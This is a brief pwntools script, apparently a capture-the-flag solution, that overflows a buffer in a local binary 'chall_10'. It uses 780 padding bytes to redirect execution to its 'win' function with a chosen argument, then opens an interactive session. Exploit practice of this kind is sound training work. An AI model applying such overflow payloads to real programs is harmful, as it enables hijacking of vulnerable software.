from pwn import *

p = process("./chall_10")

elf = ELF("./chall_10")

payload = b's'*780+p32(elf.sym.win)+b's'*4+p32(0x1a55fac3)

p.sendline(payload)

p.interactive()
